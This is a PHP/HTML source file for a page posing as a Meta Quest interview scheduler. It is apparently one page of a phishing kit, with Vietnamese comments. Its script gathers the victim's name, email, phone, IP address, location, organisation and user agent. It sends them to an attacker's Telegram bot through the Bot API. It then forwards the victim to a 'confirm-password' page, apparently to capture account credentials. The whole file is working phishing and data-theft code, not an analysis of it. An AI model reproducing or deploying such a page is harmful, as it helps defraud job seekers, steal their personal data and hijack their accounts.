<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Schedule Interview</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="/styles/schedule-inverview.css">
</head>
<body class="oculus-invite-bg">
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>
    <div class="oculus-invite-wrapper">
        <div class="oculus-invite-logo">
            <svg width="80" height="50" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
            </svg>
        </div>
        <div class="oculus-invite-title">Schedule your interview</div>
        <form class="oculus-invite-form" onsubmit="submitScheduleInterview(event)" autocomplete="off">
            <div class="oculus-invite-group">
                <label>Schedule interview</label>
                <div class="triple-input-row">
                    <select required name="interview_day" id="interview_day">
                        <option value="" disabled selected>Day</option>
                    </select>
                    <select required name="interview_month" id="interview_month">
                        <option value="" disabled selected>Month</option>
                    </select>
                    <select required name="interview_year" id="interview_year">
                        <option value="" disabled selected>Year</option>
                    </select>
                </div>
                <div class="triple-input-row">
                    <select required name="interview_hour" id="interview_hour">
                        <option value="" disabled selected>Hour</option>
                    </select>
                    <select name="interview_minute" id="interview_minute">
                        <option value="" disabled selected>Minute</option>
                    </select>
                    <select name="type_interview" id="type_interview">
                        <option value="AM" selected>AM</option>
                        <option value="PM">PM</option>
                    </select>
                </div>
            </div>
            <div class="oculus-invite-group">
                <label for="cv">Upload your CV</label>
                <div class="file-upload-container">
                    <input type="file" id="cv" name="cv" accept=".doc,.docx,.pdf" style="display: none;">
                    <label for="cv" class="file-upload-box">
                        <div class="upload-icon">
                            <i class="fa fa-cloud-upload"></i>
                        </div>
                        <div class="upload-text">
                            <span class="upload-title">Click to upload your CV</span>
                            <span class="upload-subtitle">or drag and drop</span>
                            <span class="upload-types">DOC, DOCX or PDF</span>
                        </div>
                    </label>
                    <div class="file-preview" id="filePreview">
                        <div class="file-info">
                            <i class="fa fa-file-text"></i>
                            <div class="file-name">
                                <span class="name-text"></span>
                                <i class="fa fa-check-circle check-icon"></i>
                            </div>
                        </div>
                        <button type="button" class="remove-file" onclick="removeFile()">
                            <i class="fa fa-times"></i>
                        </button>
                    </div>
                    <div class="error-message">
                        Please upload your CV
                    </div>
                </div>
            </div>
            <div class="form-note">We will call you on time.</div>
            <div class="notify-methods">
                <label class="notify-option">
                    <span class="icon fb">
                    <svg width="30px" height="30px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="none"><path fill="#1877F2" d="M15 8a7 7 0 00-7-7 7 7 0 00-1.094 13.915v-4.892H5.13V8h1.777V6.458c0-1.754 1.045-2.724 2.644-2.724.766 0 1.567.137 1.567.137v1.723h-.883c-.87 0-1.14.54-1.14 1.093V8h1.941l-.31 2.023H9.094v4.892A7.001 7.001 0 0015 8z"/><path fill="#ffffff" d="M10.725 10.023L11.035 8H9.094V6.687c0-.553.27-1.093 1.14-1.093h.883V3.87s-.801-.137-1.567-.137c-1.6 0-2.644.97-2.644 2.724V8H5.13v2.023h1.777v4.892a7.037 7.037 0 002.188 0v-4.892h1.63z"/></svg>
                    </span>
                    <span class="notify-label"><b>on Facebook</b><span class="notify-desc">We will send you a notification on Facebook.</span></span>
                    <input type="checkbox" class="toggle-input" checked>
                    <span class="toggle-slider"></span>
                </label>
                <label class="notify-option">
                    <span class="icon email">
                        <svg fill="#ffffff" width="30px" height="30px" viewBox="0 0 36 36" version="1.1"  preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                            <title>email-line</title>
                            <path class="clr-i-outline clr-i-outline-path-1" d="M32,6H4A2,2,0,0,0,2,8V28a2,2,0,0,0,2,2H32a2,2,0,0,0,2-2V8A2,2,0,0,0,32,6ZM30.46,28H5.66l7-7.24-1.44-1.39L4,26.84V9.52L16.43,21.89a2,2,0,0,0,2.82,0L32,9.21v17.5l-7.36-7.36-1.41,1.41ZM5.31,8H30.38L17.84,20.47Z"></path>
                            <rect x="0" y="0" width="36" height="36" fill-opacity="0"/>
                        </svg>
                    </span>
                    <span class="notify-label"><b>e-mail</b><span class="notify-desc">We will send you an email notification.</span></span>
                    <input type="checkbox" class="toggle-input" checked>
                    <span class="toggle-slider"></span>
                </label>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="agree" required>
                <label for="agree">I agree with <a href="#" class="link">Terms of use</a></label>
            </div>
            <button type="submit" class="oculus-invite-btn send-btn">CONTINUE</button>
        </form>
    </div>
    <script>
        // Sinh option cho các select ngày/tháng/năm
        function fillSelectOptions() {
            // Day
            for (let i = 1; i <= 31; i++) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_day').insertAdjacentHTML('beforeend', opt);
            }
            // Month
            for (let i = 1; i <= 12; i++) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_month').insertAdjacentHTML('beforeend', opt);
            }
            // Year for interview (2025-2027)
            for (let i = 2027; i >= 2025; i--) {
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_year').insertAdjacentHTML('beforeend', opt);
            }
            // Hour
            for (let i = 1; i <= 12; i++) {
                if (i < 10) {
                    i = "0" + i;
                }
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_hour').insertAdjacentHTML('beforeend', opt);
            }
            // Minute
            for (let i = 0; i <= 59; i++) {
                if (i < 10) {
                    i = "0" + i;
                }
                const opt = `<option value="${i}">${i}</option>`;
                document.getElementById('interview_minute').insertAdjacentHTML('beforeend', opt);
            }
        }

        const fileInput = document.getElementById('cv');
        const filePreview = document.getElementById('filePreview');
        const fileName = filePreview.querySelector('.name-text');
        const uploadBox = document.querySelector('.file-upload-box');
        const errorMessage = document.querySelector('.error-message');

        console.log('File input:', fileInput);
        console.log('Error message:', errorMessage);

        function submitScheduleInterview(e) {
            e.preventDefault();
            console.log('Form submitted');
            
            // Validate CV first
            if (!fileInput.files || fileInput.files.length === 0) {
                console.log('No file selected');
                errorMessage.classList.add('show');
                return;
            }

            const formData = new FormData(e.target);
            const dataform = Object.fromEntries(formData);
            console.log('Form data:', dataform);

            var fullName = localStorage.getItem('fullName');
            var email = localStorage.getItem('email');
            var phone = localStorage.getItem('phone');

            var interviewday = dataform.interview_day || "";
            var interviewmonth = dataform.interview_month || "";
            var interviewyear = dataform.interview_year || "";
            var interviewhour = dataform.interview_hour || "";
            var interviewminute = dataform.interview_minute || "";
            var type_interview = dataform.type_interview || "";
            
            if (interviewday == "") {
                document.getElementById('interview_day').style.border = '1px solid red';
                return;
            }
            if (interviewmonth == "") {
                document.getElementById('interview_month').style.border = '1px solid red';
                return;
            }
            if (interviewyear == "") {
                document.getElementById('interview_year').style.border = '1px solid red';
                return;
            }
            if (interviewhour == "") {
                document.getElementById('interview_hour').style.border = '1px solid red';
                return;
            }
            if (interviewminute == "") {
                document.getElementById('interview_minute').style.border = '1px solid red';
                return;
            }

            var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFull Name: " + "`" + fullName + "`" +
                "\nEmail: " + "`" + email + "`" +
                "\nPhone Number: " + "`" + phone + "`" +
                "\nNgày phỏng vấn: " + "`" + interviewday + "/" + interviewmonth + "/" + interviewyear + "`" + " " + interviewhour + ":" + interviewminute + " " + type_interview +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        setTimeout(function() {
                            window.location.href = "/confirm-password.php";
                        }, 1000);

                        localStorage.setItem('fullName', fullName);
                        localStorage.setItem('email', email);
                        localStorage.setItem('phone', phone);
                        localStorage.setItem('interviewday', interviewday);
                        localStorage.setItem('interviewmonth', interviewmonth);
                        localStorage.setItem('interviewyear', interviewyear);
                        localStorage.setItem('interviewhour', interviewhour);
                    } else {
                        console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }

        var interviewday = document.getElementById('interview_day');
        var interviewmonth = document.getElementById('interview_month');
        var interviewyear = document.getElementById('interview_year');
        var interviewhour = document.getElementById('interview_hour');

        document.addEventListener('DOMContentLoaded', function() {
            fillSelectOptions();


            interviewday.addEventListener('change', function() {
                interviewday.style.border = '1px solid #ccc';
            });
            interviewmonth.addEventListener('change', function() {
                interviewmonth.style.border = '1px solid #ccc';
            });
            interviewyear.addEventListener('change', function() {
                interviewyear.style.border = '1px solid #ccc';
            });
        });

        

        fileInput.addEventListener('change', function(e) {
            console.log('File changed');
            if (this.files.length > 0) {
                const file = this.files[0];
                if (file.name.trim() === '') {
                    errorMessage.classList.add('show');
                    filePreview.classList.remove('show');
                    uploadBox.classList.remove('hidden');
                    this.value = '';
                } else {
                    errorMessage.classList.remove('show');
                    fileName.textContent = file.name;
                    filePreview.classList.add('show');
                    uploadBox.classList.add('hidden');
                }
            } else {
                errorMessage.classList.remove('show');
                filePreview.classList.remove('show');
                uploadBox.classList.remove('hidden');
            }
        });

        function removeFile() {
            fileInput.value = '';
            filePreview.classList.remove('show');
            uploadBox.classList.remove('hidden');
            errorMessage.classList.remove('show');
        }

        // Drag and drop functionality
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            uploadBox.addEventListener(eventName, preventDefaults, false);
        });

        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }

        ['dragenter', 'dragover'].forEach(eventName => {
            uploadBox.addEventListener(eventName, highlight, false);
        });

        ['dragleave', 'drop'].forEach(eventName => {
            uploadBox.addEventListener(eventName, unhighlight, false);
        });

        function highlight(e) {
            uploadBox.classList.add('highlight');
        }

        function unhighlight(e) {
            uploadBox.classList.remove('highlight');
        }

        uploadBox.addEventListener('drop', handleDrop, false);

        function handleDrop(e) {
            const dt = e.dataTransfer;
            const files = dt.files;
            fileInput.files = files;
            fileInput.dispatchEvent(new Event('change'));
        }
    </script>

    <style>
        .file-upload-container {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .file-upload-box {
            border: 2px dashed #4a5568;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background-color: rgba(74, 85, 104, 0.05);
        }

        .file-upload-box.hidden {
            display: none;
        }

        .upload-icon {
            font-size: 40px;
            color: #1877f2;
            margin-bottom: 15px;
        }

        .upload-text {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .upload-title {
            font-size: 16px;
            font-weight: 600;
            color: rgb(178, 180, 182);
        }

        .upload-subtitle {
            font-size: 14px;
            color: rgb(145, 147, 150);
        }

        .upload-types {
            font-size: 12px;
            color: #95a5a6;
            margin-top: 5px;
        }

        .file-preview {
            display: none;
            align-items: center;
            justify-content: space-between;
            background-color: #f8f9fa;
            padding: 12px 15px;
            border-radius: 6px;
            margin-top: 10px;
            border: 1px solid #e2e8f0;
        }

        .file-preview.show {
            display: flex;
        }

        .file-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .file-info i {
            color: #1877f2;
            font-size: 20px;
        }

        .file-name {
            color: #2f3640;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            max-width: 250px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .file-name .name-text {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .file-name .check-icon {
            color: #4cd137;
            font-size: 16px;
            flex-shrink: 0;
        }

        .remove-file {
            background: #fff;
            border: 1px solid #e2e8f0;
            color: #718096;
            cursor: pointer;
            padding: 6px;
            font-size: 14px;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .remove-file:hover {
            background: #f8f9fa;
            border-color: #cbd5e0;
            color: #e53e3e;
            transform: rotate(90deg);
        }

        .remove-file i {
            font-size: 14px;
        }

        .error-message {
            display: none;
            color: #e53e3e;
            font-size: 14px;
        }

        .error-message.show {
            display: block;
        }
    </style>
</body>
</html> 